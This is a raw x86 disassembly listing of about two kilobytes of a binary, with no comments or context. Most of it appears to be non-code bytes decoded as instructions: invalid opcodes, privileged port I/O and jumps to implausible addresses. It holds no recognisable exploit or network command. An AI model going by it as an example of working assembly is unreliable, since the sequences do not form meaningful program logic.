  4125a0:	mov    ebp,0x45000547
  4125a5:	add    esi,DWORD PTR [ecx-0x48]
  4125a8:	pop    ebx
  4125a9:	cmp    eax,0xe23e01fe
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	enter  0x6880,0x9
  4125b4:	xchg   ebp,eax
  4125b5:	in     al,dx
  4125b6:	mov    al,BYTE PTR [esi-0x20658]
  4125bc:	and    DWORD PTR [ebp+edx*1+0x4],edi
  4125c0:	mov    BYTE PTR ds:0xe1ee8940,al
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	cwde   
  4125c9:	jl     0x41254e
  4125cb:	adc    BYTE PTR [ebp+eax*1-0x12e97500],dl
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    BYTE PTR [edi+0xd],bh
  4125d7:	add    al,BYTE PTR [eax]
  4125d9:	stos   BYTE PTR es:[edi],al
  4125da:	add    bh,BYTE PTR [edi-0x71f97778]
  4125e0:	sbb    al,0x54
  4125e2:	add    eax,0x80817500
  4125e7:	adc    DWORD PTR [eax],0x54
  4125ea:	add    eax,0xecd68900
  4125ef:	add    DWORD PTR [eax],eax
  4125f1:	dec    eax
  4125f2:	lds    ecx,FWORD PTR [eax-0x20bce52]
  4125f8:	jmp    FWORD PTR [esi]
  4125fa:	push   0x7e
  4125fc:	cvtps2pi mm4,xmm2
  4125ff:	add    DWORD PTR [ebx-0x21549],ecx
  412605:	push   ss
  412606:	ins    DWORD PTR es:[edi],dx
  412607:	hlt    
  412608:	add    ebx,esp
  41260a:	push   0xe1218742
  41260f:	jae    0x41262c
  412611:	xor    eax,0x187501e2
  412616:	imul   edi,DWORD PTR [esi+0xf],0x35
  41261a:	loop   0x41261d
  41261c:	mov    DWORD PTR [edi-0x21000216],ebp
  412622:	mov    ds:0xe635ad7a,al
  412627:	add    DWORD PTR [eax],eax
  412629:	mov    eax,0x3103f470
  41262e:	loop   0x4126a8
  412630:	test   DWORD PTR [ecx],ebx
  412632:	out    dx,al
  412633:	add    DWORD PTR [eax],eax
  412635:	stos   DWORD PTR es:[edi],eax
  412636:	jmp    0xd677:0x21afc8ff
  41263d:	add    BYTE PTR [edx+0x15],dl
  412640:	jl     0x412649
  412642:	add    edi,DWORD PTR [ebx+0x36]
  412645:	out    0x78,eax
  412647:	inc    BYTE PTR [esi+edi*8]
  41264a:	mov    edx,0x2ddf7f2f
  41264f:	xor    dh,BYTE PTR [edi-0x33]
  412652:	mov    DWORD PTR [esi+0x6b76fe05],esp
  412658:	xor    al,0x82
  41265a:	push   eax
  41265b:	in     al,0xb2
  41265d:	mov    dh,BYTE PTR [edi-0x26]
  412660:	inc    esp
  412661:	sti    
  412662:	pop    esi
  412663:	mov    bh,0x80
  412665:	out    0x30,al
  412667:	pop    ss
  412668:	ja     0x412637
  41266a:	pop    ecx
  41266b:	jle    0x412672
  41266d:	inc    BYTE PTR [esi+0x9]
  412670:	inc    esi
  412671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412672:	(bad)  
  412674:	out    dx,eax
  412675:	add    esi,DWORD PTR [edx-0x40fd693e]
  41267b:	adc    al,0xe3
  41267d:	add    esi,DWORD PTR [ecx]
  41267f:	xchg   BYTE PTR [eax],dl
  412681:	sti    
  412682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412683:	adc    dh,BYTE PTR [edx+0x7d]
  412686:	es or  eax,0x8eb803e7
  41268c:	iret   
  41268d:	inc    DWORD PTR [esi]
  41268f:	clc    
  412690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412691:	jp     0x41265f
  412693:	adc    al,0xe3
  412695:	add    esi,DWORD PTR [ecx]
  412697:	sub    BYTE PTR [ebp-0xd],0x32
  41269b:	or     edi,esp
  41269d:	js     0x41264b
  41269f:	adc    bl,ch
  4126a1:	add    eax,DWORD PTR [eax]
  4126a3:	xor    DWORD PTR [ebx-0x8fcfe29],eax
  4126a9:	sub    DWORD PTR [ebx+0x3e],edi
  4126ac:	or     bl,BYTE PTR [ebp-0x19]
  4126af:	xor    cl,BYTE PTR [ecx]
  4126b1:	out    0x8e,eax
  4126b3:	sbb    DWORD PTR [ebp+eiz*2-0x18f6cd0d],eax
  4126ba:	jp     0x412670
  4126bc:	adc    bl,ah
  4126be:	add    esi,DWORD PTR [ecx]
  4126c0:	dec    ecx
  4126c1:	jo     0x412718
  4126c3:	cmp    cl,BYTE PTR ds:0x8ea803e7
  4126c9:	xlat   BYTE PTR ds:[ebx]
  4126ca:	dec    DWORD PTR [esi+0x1e7d62f7]
  4126d0:	or     eax,0x18ab03e7
  4126d5:	jmp    0x600b9eaf
  4126da:	adc    al,0x6e
  4126dc:	test   ebx,ebp
  4126de:	pop    es
  4126df:	xor    DWORD PTR [ecx],ecx
  4126e1:	cmp    al,0x1d
  4126e3:	test   al,0x8e
  4126e5:	xlat   BYTE PTR ds:[ebx]
  4126e6:	pop    es
  4126e7:	xor    DWORD PTR [ecx],ecx
  4126e9:	add    BYTE PTR [eax-0x45],ah
  4126ec:	adc    BYTE PTR [ecx+ebp*8],al
  4126ef:	xor    cl,BYTE PTR [ecx-0x79]
  4126f2:	push   edi
  4126f3:	adc    DWORD PTR ds:0x8ea5e900,ecx
  4126f9:	adc    ch,ch
  4126fb:	xor    cl,BYTE PTR [ecx]
  4126fd:	mov    DWORD PTR [edi+0x45],esp
  412700:	or     eax,0x19ace900
  412705:	add    bl,BYTE PTR [ebx-0x7735cd00]
  41270b:	fnstenv ds:0x32e51c87
  412711:	or     DWORD PTR [ebx+0x0],esi
  412714:	scas   al,BYTE PTR es:[edi]
  412715:	(bad)  
  412716:	adc    ch,ah
  412718:	xor    cl,BYTE PTR [ecx]
  41271a:	xchg   DWORD PTR [edi+0x4d],ebp
  41271d:	or     eax,0x8e72e900
  412722:	scas   al,BYTE PTR es:[edi]
  412723:	in     eax,0x36
  412725:	or     DWORD PTR [eax],eax
  412727:	jo     0x4126d4
  412729:	sbb    DWORD PTR [ecx+ebp*8],eax
  41272c:	xor    al,BYTE PTR [eax+0x92ed186]
  412732:	add    BYTE PTR [ecx],bh
  412734:	adc    eax,0x2efd8bf6
  412739:	or     DWORD PTR [eax],eax
  41273b:	pushf  
  41273c:	dec    ebp
  41273d:	add    BYTE PTR [esi+0x92ef9],0x70
  412744:	stos   DWORD PTR es:[edi],eax
  412745:	adc    DWORD PTR [ecx+ebp*8],eax
  412748:	xor    cl,BYTE PTR [ecx-0x79]
  41274b:	inc    edi
  41274c:	push   ecx
  41274d:	or     eax,0x8fb5e900
  412752:	adc    ch,ch
  412754:	xor    cl,BYTE PTR [ecx]
  412756:	mov    DWORD PTR [edi+0x1a],esp
  412759:	or     eax,0x2982e900
  41275e:	call   FWORD PTR [esi+0x46]
  412761:	or     eax,0x71480000
  412766:	adc    eax,0x419ce8b
  41276b:	add    BYTE PTR [eax],al
  41276d:	pop    eax
  41276e:	test   DWORD PTR [esi+0xa4c18],eax
  412774:	inc    eax
  412775:	shl    DWORD PTR [edi+0xa48041c],0x85
  41277c:	xchg   BYTE PTR [eax],ch
  41277e:	push   cs
  41277f:	add    BYTE PTR [eax],al
  412781:	xchg   ebx,eax
  412782:	sbb    BYTE PTR [eax],0x4
  412785:	or     BYTE PTR [edx],cl
  412787:	shl    BYTE PTR [eax],1
  412789:	or     DWORD PTR [eax+0xa18041c],ebx
  41278f:	jno    0x4127aa
  412791:	xchg   ebx,eax
  412792:	adc    BYTE PTR [eax],0x4
  412795:	or     BYTE PTR [edx],cl
  412797:	test   DWORD PTR [esi+0x130],eax
  41279d:	cwde   
  41279e:	test   BYTE PTR [esi+0x9cc1c],ch
  4127a4:	mov    DWORD PTR [esi+0x1a],ecx
  4127a7:	add    al,0x0
  4127a9:	enter  0xb686,0x18
  4127ad:	fmul   QWORD PTR [ecx]
  4127af:	add    al,dl
  4127b1:	imul   ebx,DWORD PTR cs:[ecx-0x3e],0xffffffc0
  4127b6:	or     DWORD PTR [edi+0x560dec44],eax
  4127bc:	push   edi
  4127bd:	adc    esi,DWORD PTR [esi+0x24]
  4127c0:	adc    BYTE PTR [ebx],dl
  4127c2:	std    
  4127c3:	cmp    DWORD PTR [eax+0x73000988],eax
  4127c9:	je     0x412759
  4127cb:	sti    
  4127cc:	add    al,0xb
  4127ce:	adc    esi,DWORD PTR [edi]
  4127d0:	xchg   BYTE PTR [eax],al
  4127d2:	ins    BYTE PTR es:[edi],dx
  4127d3:	or     eax,0x50dc0000
  4127d8:	repz fdiv DWORD PTR [ebx]
  4127db:	int    0x7f
  4127dd:	loopne 0x412810
  4127df:	out    0x60,al
  4127e1:	xor    DWORD PTR [ecx-0x14],0xe029c25f
  4127e8:	cmp    al,0x86
  4127ea:	or     eax,0xc50001ec
  4127ef:	cld    
  4127f0:	xor    BYTE PTR ds:[ecx],0xe0
  4127f4:	add    DWORD PTR [ecx+0x34],esi
  4127f7:	arpl   di,bp
  4127f9:	add    cl,BYTE PTR [edx-0x11]
  4127fc:	add    BYTE PTR ds:[edx+eiz*8],dh
  412800:	add    DWORD PTR [edx+0x30],esi
  412803:	adc    edi,DWORD PTR ds:0x1e29c00
  412809:	jb     0x41283b
  41280b:	and    eax,ecx
  41280d:	call   0xc0c4374b
  412812:	xor    dl,BYTE PTR [edx]
  412814:	in     al,dx
  412815:	es sti 
  412817:	imul   edi,edi,0x55
  41281a:	stos   BYTE PTR es:[edi],al
  41281b:	and    al,0x8b
  41281d:	fcomp  st(1)
  41281f:	(bad)  
  412820:	sti    
  412821:	std    
  412822:	out    0x55,al
  412824:	dec    eax
  412825:	sbb    BYTE PTR [ebx],ch
  412827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412828:	pusha  
  412829:	pop    esi
  41282a:	repz cli 
  41282c:	add    DWORD PTR [ebp-0x27],edx
  41282f:	out    dx,al
  412830:	sti    
  412831:	std    
  412832:	mov    BYTE PTR [ebx+0x3500c084],0xcc
  412839:	ret    
  41283a:	or     BYTE PTR [ecx],dh
  41283c:	scas   eax,DWORD PTR es:[edi]
  41283d:	mov    WORD PTR [ebp+edx*2-0x16],ds
  412841:	push   esi
  412842:	push   esi
  412843:	mov    edx,0x49be8311
  412848:	out    0x1,al
  41284a:	add    BYTE PTR [ecx],dh
  41284c:	fwait
  41284d:	adc    BYTE PTR [edx+ebp*1-0x4ffffe1f],al
  412854:	test   DWORD PTR [ecx-0x18f6cf00],0x5b883674
  41285e:	sub    BYTE PTR [ecx+0xd],cl
  412861:	pop    edx
  412862:	ds pop ecx
  412864:	cmp    al,0xd2
  412866:	add    BYTE PTR [edi-0x80],bl
  412869:	mov    ch,0xeb
  41286b:	and    eax,esi
  41286d:	mov    esi,0xbfc3bb00
  412872:	std    
  412873:	dec    ebx
  412874:	hlt    
  412875:	scas   al,BYTE PTR es:[edi]
  412876:	(bad)  
  412877:	cmc    
  412878:	sub    al,0xff
  41287a:	mov    WORD PTR [edi+0x3103e319],ds
  412880:	jg     0x412824
  412882:	daa    
  412883:	or     ah,BYTE PTR es:[eax+0x6f53de05]
  41288a:	add    eax,0x7d78b14
  41288f:	xor    DWORD PTR [ecx],ecx
  412891:	pusha  
  412892:	mov    eax,ds:0x3e70d4d
  412897:	pop    edi
  412898:	push   esi
  412899:	ret    0xc5
  41289c:	sub    DWORD PTR [ecx],ecx
  41289e:	push   0xffffffd0
  4128a0:	in     al,dx
  4128a1:	or     DWORD PTR [ebp-0x18f6d2e1],edx
  4128a7:	mov    cs,WORD PTR [edx+eax*1-0x44]
  4128ab:	sbb    ch,BYTE PTR [eax+0x3107d78a]
  4128b1:	or     DWORD PTR [eax-0x77],esp
  4128b4:	sub    DWORD PTR ds:0x827103e7,ecx
  4128ba:	push   ebp
  4128bb:	pop    ds
  4128bc:	sub    eax,0xb78ae709
  4128c1:	sbb    bl,ch
  4128c3:	add    esi,DWORD PTR [ecx]
  4128c5:	and    BYTE PTR [ebp+0x1b],0x35
  4128c9:	or     edi,esp
  4128cb:	lea    ebp,[ecx]
  4128cd:	pop    es
  4128ce:	xor    BYTE PTR [ecx],al
  4128d0:	jno    0x412852
  4128d2:	add    cl,ah
  4128d4:	xor    esi,DWORD PTR [ebx+0x932e51c]
  4128da:	jae    0x4128dc
  4128dc:	stos   BYTE PTR es:[edi],al
  4128dd:	mov    dl,BYTE PTR [eax]
  4128df:	in     eax,0x32
  4128e1:	or     DWORD PTR [edi+0xd456f],eax
  4128e7:	jmp    0xe5efb4de
  4128ec:	or     DWORD PTR cs:[eax],eax
  4128ef:	jo     0x4128a8
  4128f1:	sbb    BYTE PTR [ecx+ebp*8],al
  4128f4:	xor    al,BYTE PTR [edx+0x936d186]
  4128fa:	add    BYTE PTR [ecx-0x572e7df3],bh
  412900:	add    BYTE PTR [ebx],bl
  412902:	add    al,BYTE PTR [ecx-0x76a8cc55]
  412908:	lahf   
  412909:	or     eax,0x1686facb
  41290e:	add    DWORD PTR [esi+0x936d9],0xffb12561
  412918:	call   0x6f40324f
  41291d:	sbb    eax,0xbde9000d
  412922:	xchg   ebx,eax
  412923:	and    al,0xed
  412925:	xor    cl,BYTE PTR [ecx]
  412927:	jg     0x41297b
  412929:	mov    ch,0x9
  41292b:	add    cl,ch
  41292d:	arpl   WORD PTR [ecx],dx
  41292f:	or     ebp,0x62021116
  412935:	popa   
  412936:	sub    eax,0xc3ab9818
  41293b:	call   0xfe35e4be
  412940:	mov    esi,0x2b594e0c
  412945:	xor    eax,0x35127f09
  41294a:	push   es
  41294b:	add    BYTE PTR [eax],al
  41294d:	mov    BYTE PTR [eax+0x4],bh
  412950:	sub    esp,edx
  412952:	sub    bl,BYTE PTR [eax]
  412954:	add    DWORD PTR [ebx-0x77ff86fa],0x44290478
  41295e:	and    DWORD PTR [eax],ebx
  412960:	mov    ebx,DWORD PTR [ecx+eiz*1]
  412963:	sbb    BYTE PTR [ecx+0x0],dl
  412966:	rol    ebx,cl
  412968:	call   0xfc34abd9
  41296d:	pop    edi
  41296e:	push   cs
  41296f:	push   0x640c257
  412974:	ret    
  412975:	xchg   BYTE PTR [eax],dh
  412977:	add    DWORD PTR [eax],eax
  412979:	add    BYTE PTR [ecx+0x6],cl
  41297c:	add    BYTE PTR [eax],al
  41297e:	leave  
  41297f:	out    dx,al
  412980:	add    BYTE PTR [eax],0x18
  412983:	push   es
  412984:	outs   dx,DWORD PTR ds:[esi]
  412985:	dec    ecx
  412986:	fwait
  412987:	jb     0x4129ad
  412989:	sbb    BYTE PTR [edi+esi*2],dl
  41298c:	inc    edx
  41298d:	cmp    ecx,DWORD PTR [esi+0x1800042a]
  412993:	jp     0x4129cf
  412995:	call   0x3d19ac
  41299a:	xchg   ebx,eax
  41299b:	(bad)  
  41299c:	call   0xfc34bba4
  4129a1:	mov    ebx,DWORD PTR [esi]
  4129a3:	fmulp  st(1),st
  4129a5:	stc    
  4129a6:	jg     0x41299b
  4129a8:	mov    al,BYTE PTR [esp+esi*1+0x15]
  4129ac:	xchg   DWORD PTR [esi+0x9f8],ecx
  4129b2:	inc    edx
  4129b3:	xlat   BYTE PTR ds:[ebx]
  4129b4:	and    al,0x1
  4129b6:	fcmovbe st,st(7)
  4129b8:	add    al,dl
  4129ba:	scas   eax,DWORD PTR es:[edi]
  4129bb:	jge    0x4129ba
  4129bd:	inc    BYTE PTR [esi+0x16]
  4129c0:	add    al,0x0
  4129c2:	cwde   
  4129c3:	test   BYTE PTR [esi+0x1e43124],bl
  4129c9:	add    BYTE PTR [eax],al
  4129cb:	jmp    DWORD PTR [edx+ebx*2-0x7d1fd63e]
  4129d2:	int    0x8e
  4129d4:	loopne 0x412991
  4129d6:	sbb    al,0x2d
  4129d8:	loopne 0x4129db
  4129da:	mov    ecx,DWORD PTR [esi]
  4129dc:	jmp    0x61eb4159
  4129e1:	adc    al,0x4
  4129e3:	xor    eax,esp
  4129e5:	mov    al,BYTE PTR [esi+0x1e449]
  4129eb:	icebp  
  4129ec:	push   0xe02d1cae
  4129f1:	add    DWORD PTR [edi+0x5cfb7],eax
  4129f7:	xor    DWORD PTR [edi-0x7a],esp
  4129fa:	sbb    BYTE PTR ds:0x218a01e0,dh
  412a00:	fmulp  st(7),st
  412a02:	(bad)  
  412a03:	repz jp 0x412a1a
  412a06:	jmp    esp
  412a08:	test   BYTE PTR ds:0x19153100,0x89
  412a0f:	scas   eax,DWORD PTR es:[edi]
  412a10:	rol    BYTE PTR ds:0x86793100,cl
  412a16:	sbb    BYTE PTR ds:0xa84001e2,ch
  412a1c:	xor    BYTE PTR [eax],ah
  412a1e:	add    al,0x31
  412a20:	loop   0x4129ac
  412a22:	xchg   BYTE PTR [ecx-0x1a],al
  412a25:	add    DWORD PTR [eax],eax
  412a27:	mov    edx,0x31041c60
  412a2c:	loop   0x4129ff
  412a2e:	and    BYTE PTR [eax],al
  412a30:	sbb    ch,BYTE PTR [eax+0x28]
  412a33:	add    al,0x31
  412a35:	loop   0x412aac
  412a37:	jb     0x4129f3
  412a39:	and    eax,ecx
  412a3b:	call   0x2058d69
  412a40:	popa   
  412a41:	or     DWORD PTR [edi],ecx
  412a43:	xchg   esi,eax
  412a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a45:	lock push ds
  412a47:	mov    DWORD PTR [edi+0x3103eb19],esi
  412a4d:	xor    eax,0xe7f096bb
  412a53:	add    ecx,DWORD PTR [esi+0x3107d786]
  412a59:	or     DWORD PTR [eax-0x62],esp
  412a5c:	push   ebp
  412a5d:	add    eax,0xf3f603e7
  412a62:	add    esi,DWORD PTR [bx+di]
  412a65:	or     DWORD PTR [edx+0x1c],ebx
  412a68:	mov    al,0x5d
  412a6a:	or     ebx,DWORD PTR [ebx+esi*1]
  412a6d:	test   BYTE PTR [ebx],dh
  412a6f:	sub    BYTE PTR [ecx],bh
  412a71:	pop    ebx
  412a72:	jb     0x412a41
  412a74:	pop    ecx
  412a75:	gs sar ah,0x44
  412a79:	push   eax
  412a7a:	adc    eax,0xdfcad85f
  412a7f:	add    esi,DWORD PTR [esi+0x3106e7f3]
  412a85:	or     DWORD PTR [ecx],ebx
  412a87:	or     BYTE PTR [esi+0x45],cl
  412a8a:	retf   
  412a8b:	sbb    ebx,DWORD PTR [esi+0x317ee7f4]
  412a91:	or     ecx,edi
  412a93:	push   0x0
  412a95:	push   esi
  412a96:	inc    ebp
  412a97:	ret    
  412a98:	sbb    edi,DWORD PTR [eax+0x631bcb54]
  412a9e:	test   BYTE PTR [ebp+0x66f23eeb],bl
  412aa4:	cld    
  412aa5:	mov    WORD PTR [edi-0x44],cs
  412aa8:	pop    eax
  412aa9:	repz add bh,ah
  412aac:	add    bl,BYTE PTR [edi+0x3103e30c]
  412ab2:	jbe    0x412a94
  412ab4:	mov    BYTE PTR [edi+0x3103e318],dh
  412aba:	add    BYTE PTR [eax],0x6f
  412abd:	sbb    al,BYTE PTR ds:0x8872e900
  412ac3:	scas   al,BYTE PTR es:[edi]
  412ac4:	add    eax,0x70000939
  412ac9:	lods   al,BYTE PTR ds:[esi]
  412aca:	sbb    BYTE PTR [ecx+ebp*8],al
  412acd:	xor    al,BYTE PTR [edx+0x92ef186]
  412ad3:	add    BYTE PTR [ecx],bl
  412ad5:	push   edx
  412ad6:	lock mov ebx,0x92edd
  412adc:	jl     0x412af9
  412ade:	add    BYTE PTR [esi+0x92ed9],0x70
  412ae5:	mov    bl,0x10
  412ae7:	add    al,0xe9
  412ae9:	xor    cl,BYTE PTR [ecx-0x79]
  412aec:	xchg   DWORD PTR [ecx],edi
  412aee:	add    eax,0x86a5e900
  412af3:	adc    ch,ch
  412af5:	xor    cl,BYTE PTR [ecx]
  412af7:	mov    DWORD PTR [edi+0x0],esp
  412afa:	and    eax,0x62e90005
  412aff:	sub    BYTE PTR [ecx+0x52111115],cl
  412b05:	jb     0x412b02
  412b07:	loope  0x412add
  412b09:	mov    eax,ds:0x375ded2a
  412b0e:	js     0x412b60
  412b10:	ret    0x32e1
  412b13:	add    BYTE PTR [ebp+ecx*8+0xe],0x84
  412b18:	nop
  412b19:	jmp    0xb33f19b8
  412b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b1f:	add    eax,0x7732e904
  412b24:	pop    ss
  412b25:	jb     0x412ae3
  412b27:	std    
  412b28:	add    ebp,ecx
  412b2a:	xor    dh,BYTE PTR [eax]
  412b2c:	mov    edi,0xbf2031df
  412b31:	sub    esi,DWORD PTR [ecx]
  412b33:	or     DWORD PTR [ecx],ebp
  412b35:	add    BYTE PTR [ecx],bl
  412b37:	or     BYTE PTR [eax],al
  412b39:	push   0x4c20ad9
  412b3e:	enter  0xc037,0xc2
  412b42:	int3   
  412b43:	or     bh,BYTE PTR [edi-0x14]
  412b46:	test   al,0x57
  412b48:	push   ecx
  412b49:	mov    esi,DWORD PTR [esi+ecx*1-0x3084a9e0]
  412b50:	xchg   ecx,esi
  412b52:	fistp  QWORD PTR [ebp+0x5c]
  412b55:	and    al,0x68
  412b57:	jge    0x412bb5
  412b59:	and    al,0x90
  412b5b:	sub    eax,0x8c0008ae
  412b60:	or     al,BYTE PTR [eax]
  412b62:	ud2    
  412b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b65:	add    BYTE PTR [eax],al
  412b67:	pop    eax
  412b68:	fild   WORD PTR [edi]
  412b6a:	lea    ebp,[esi+ecx*1+0xa480000]
  412b71:	mov    DWORD PTR [esp+ebp*1+0x5],esp
  412b75:	xchg   DWORD PTR [esi-0x211a4],eax
  412b7b:	aad    0x81
  412b7d:	add    BYTE PTR [eax+0x49],ch
  412b80:	or     dh,BYTE PTR [edi]
  412b82:	enter  0x19fe,0x87
  412b86:	mov    fs,WORD PTR [esi+ebp*8]
  412b89:	std    
  412b8a:	call   DWORD PTR [ebx]
  412b8c:	lds    esi,FWORD PTR [esi+0x4]
  412b8f:	repz (bad) 
  412b91:	out    0xb,eax
  412b93:	repz les eax,FWORD PTR [ecx]
  412b96:	add    BYTE PTR [eax],ah
  412b98:	add    al,0x0
  412b9a:	jmp    0x412bb6
  412b9c:	aaa    
  412b9d:	ror    BYTE PTR [ebx+0x40296],0x8
  412ba4:	add    esi,DWORD PTR [esi+0x45b7e711]
  412baa:	add    DWORD PTR [ebx+0x3e],esp
  412bad:	xchg   esi,eax
  412bae:	add    al,0x31
  412bb0:	imul   eax,DWORD PTR ds:0x8afdaa8a,0xc
  412bb7:	mov    dh,0x7a
  412bb9:	jg     0x412bc3
  412bbb:	sub    eax,0x870d01e0
  412bc0:	iret   
  412bc1:	or     dh,BYTE PTR [esi-0x711e8f00]
  412bc7:	dec    esp
  412bc8:	(bad)  
  412bc9:	fisttp DWORD PTR [esi+0x1e42d96]
  412bcf:	add    BYTE PTR [eax+0x30b784eb],ch
  412bd5:	loopne 0x412bd8
  412bd7:	add    BYTE PTR [eax],dh
  412bd9:	jbe    0x412bd8
  412bdb:	add    esi,DWORD PTR [ecx]
  412bdd:	loopne 0x412be3
  412bdf:	mov    gs,WORD PTR [ecx]
  412be1:	fadd   QWORD PTR [ecx]
  412be3:	add    BYTE PTR [edx+0x3103fd65],ch
  412be9:	loopne 0x412b77
  412beb:	enter  0x5e1a,0x8
  412bef:	add    al,0x31
  412bf1:	loopne 0x412b75
  412bf3:	div    DWORD PTR [ecx]
  412bf5:	dec    eax
  412bf6:	add    DWORD PTR [eax],eax
  412bf8:	(bad)  
  412bf9:	fimul  WORD PTR [ecx-0x79]
  412bfc:	scas   eax,DWORD PTR es:[edi]
  412bfd:	(bad)  
  412bff:	(bad)  
  412c00:	ds clc 
  412c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c03:	or     BYTE PTR ds:0xb30d01e0,ch
  412c09:	sbb    bh,dh
  412c0b:	std    
  412c0c:	es js  0x412c4f
  412c0f:	and    al,0x61
  412c11:	pop    eax
  412c12:	add    al,0x65
  412c14:	xor    dl,ah
  412c16:	cmp    al,0xc2
  412c18:	xchg   esp,ebx
  412c1a:	mov    dl,BYTE PTR [ebp+ecx*2-0x4e]
  412c1e:	in     al,dx
  412c1f:	pop    es
  412c20:	mov    dl,0x7a
  412c22:	add    DWORD PTR ds:0x1a8af,ecx
  412c28:	add    BYTE PTR [ecx],dh
  412c2a:	or     esi,esi
  412c2c:	mov    cl,0x72
  412c2e:	or     esi,ebp
  412c30:	mov    cl,0x6a
  412c32:	or     ah,BYTE PTR [edx+0x40]
  412c35:	scas   eax,DWORD PTR es:[edi]
  412c36:	add    eax,0x30b93862
  412c3b:	inc    edx
  412c3c:	or     DWORD PTR [ebp+0x3103e8b8],ebp
  412c42:	and    BYTE PTR [ebp+0x24],0x2d
  412c46:	or     edi,esp
  412c48:	xchg   BYTE PTR ds:0x4d402dfc,dh
  412c4e:	or     eax,0x9310be7
  412c53:	sar    BYTE PTR [esi-0x69dd0dd],cl
  412c59:	dec    eax
  412c5a:	lock jnp 0x412c8c
  412c5d:	mov    edx,0x7e6be784
  412c62:	in     al,dx
  412c63:	mov    dl,0x81
  412c65:	sub    eax,0xe703e705
  412c6a:	adc    BYTE PTR [edx-0x7f],dh
  412c6d:	xor    eax,0x1803e705
  412c72:	icebp  
  412c73:	pop    ebp
  412c74:	add    BYTE PTR [eax],cl
  412c76:	icebp  
  412c77:	ret    0x1807
  412c7a:	icebp  
  412c7b:	push   0xe86131c0
  412c80:	add    ecx,DWORD PTR [eax+0x7]
  412c83:	cli    
  412c84:	clc    
  412c85:	test   al,0x3
  412c87:	bound  esi,QWORD PTR [edi]
  412c89:	jmp    0x4a180b
  412c8e:	push   0x66cc1ac6
  412c93:	push   ebp
  412c94:	retf   
  412c95:	daa    
  412c96:	lahf   
  412c97:	add    eax,0x1d554f60
  412c9c:	ret    0x34fc
  412c9f:	test   DWORD PTR [ecx],ebx
  412ca1:	add    esi,DWORD PTR [ecx]
  412ca3:	or     DWORD PTR [eax],eax
  412ca5:	fs xchg ebp,eax
  412ca7:	or     BYTE PTR [eax],al
  412ca9:	jmp    0x130caee0
  412cae:	cmc    
  412caf:	or     DWORD PTR [ebp+eax*1+0x41],0x32
  412cb4:	dec    esp
  412cb5:	or     eax,0x1384fe09
  412cba:	xor    cl,BYTE PTR [ecx]
  412cbc:	add    BYTE PTR [edx+0x6e],dh
  412cbf:	and    eax,0xec2e7310
  412cc4:	aaa    
  412cc5:	popf   
  412cc6:	das    
  412cc7:	or     DWORD PTR [ecx-0x46eab163],ecx
  412ccd:	jmp    0x412d01
  412ccf:	or     DWORD PTR [eax],eax
  412cd1:	xchg   ebp,eax
  412cd2:	xor    cl,BYTE PTR ss:[esi-0x2146933]
  412cd9:	fimul  WORD PTR [edi]
  412cdb:	mov    edi,0x8232e900
  412ce0:	push   esp
  412ce1:	lds    eax,FWORD PTR [edx+0x32]
  412ce4:	fidivr DWORD PTR [edx+0x53]
  412ce7:	or     BYTE PTR [ebx-0x15],0xbd
  412ceb:	loopne 0x412d16
  412ced:	push   ebp
  412cee:	adc    DWORD PTR [ecx],esp
  412cf0:	mov    ah,BYTE PTR ds:0x3a092800
  412cf6:	call   0x28822fdc
  412cfb:	or     cl,bh
  412cfd:	jb     0x412cba
  412cff:	mov    edx,0xabd5243c
  412d04:	pop    esp
  412d05:	and    al,0x1
  412d07:	cli    
  412d08:	into   
  412d09:	or     eax,0xa1465
  412d0e:	jmp    0xf9657a7e
  412d13:	mov    WORD PTR [ecx+edx*2+0x38],es
  412d17:	stos   BYTE PTR es:[edi],al
  412d18:	mov    ebx,0xed0b5be8
  412d1d:	std    
  412d1e:	add    BYTE PTR [ebx-0x7cefdbbf],al
  412d24:	pop    ecx
  412d25:	and    al,0x18
  412d27:	sbb    DWORD PTR [edi-0x79],edx
  412d2a:	into   
  412d2b:	push   ebx
  412d2c:	fucomp st(0)
  412d2e:	lahf   
  412d2f:	push   edx
  412d30:	repnz sti 
  412d32:	sub    eax,DWORD PTR [eax-0x2bdbb382]
  412d38:	pop    es
  412d39:	jmp    0xc523dcf6
  412d3e:	dec    esi
  412d3f:	pop    es
  412d40:	loopne 0x412cc9
  412d42:	ins    BYTE PTR es:[edi],dx
  412d43:	xor    al,0x1d
  412d45:	mov    ebp,0xc27fcafa
  412d4a:	shl    eax,0x11
  412d4d:	inc    ecx
  412d4f:	fwait
  412d50:	sub    ah,BYTE PTR [eax+edx*1]
  412d53:	xchg   ebx,eax
  412d54:	into   
  412d55:	jbe    0x412d5d
  412d57:	add    BYTE PTR [ecx],dl
  412d59:	inc    ecx
  412d5a:	and    al,0x18
  412d5c:	xor    edi,DWORD PTR [edi]
  412d5e:	aaa    
  412d5f:	mov    ?,WORD PTR [edx+ebp*8-0x3]
  412d63:	inc    DWORD PTR ds:0x13514f2c
  412d69:	ret    
  412d6a:	call   0xfc348fd2
  412d6f:	mov    esp,DWORD PTR [ecx+ebp*1]
  412d72:	adc    BYTE PTR [ebx+0x24447f80],cl
  412d78:	pusha  
  412d79:	pop    eax
  412d7a:	push   eax
  412d7b:	mov    ebp,DWORD PTR [esi+0x6ffa50de]
  412d81:	repz xchg eax,ecx
  412d84:	and    eax,eax
  412d86:	xchg   DWORD PTR [esp+0x1d],ebp
  412d8a:	mov    eax,0x2a9fb2ab
  412d8f:	test   ecx,0xc1c1ca7e
  412d95:	adc    bh,bh
  412d97:	leave  
  412d98:	xor    edi,ebx
  412d9a:	retf   0x7d39
  412d9d:	les    edx,FWORD PTR [ecx]
  412d9f:	jb     0x412dd6
  412da1:	ja     0x412df0
  412da3:	and    al,0x25
  412da5:	jns    0x412df4
  412da7:	and    al,0x19
  412da9:	imul   edx,DWORD PTR [ebp+0x24],0x7e4d41
  412db0:	pop    ecx
  412db1:	loope  0x412db4
  412db3:	cmp    DWORD PTR [edi-0x2900021d],esi
  412db9:	leave  
